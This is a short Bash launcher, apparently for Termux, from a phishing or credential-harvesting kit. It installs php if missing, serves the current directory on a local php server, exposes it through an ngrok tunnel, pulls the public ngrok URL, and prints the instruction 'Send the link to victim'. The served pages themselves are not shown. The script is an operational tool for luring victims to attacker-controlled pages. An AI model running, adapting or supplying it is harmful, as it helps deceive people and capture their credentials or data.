#!/usr/bin/bash
printf "\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m Please turn on device hotspot, otherwise you won't get the link. "
installPhp(){
  echo "This script requires php, that is not installed on the system.
    Installing php..."
    sleep 1
    pkg install php > /dev/null 2>&1
}

command -v php > /dev/null 2>&1 || installPhp
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1

sleep 1

printf "\n\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m Starting php local server on port 1234..."
php -S 127.0.0.1:1234 -t ./ > /dev/null 2>&1 &

sleep 2

printf "\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m Starting ngrok port forwarding..."
~/ngrok http 1234 > /dev/null 2>&1 &
sleep 5

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
printf "\n\n \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link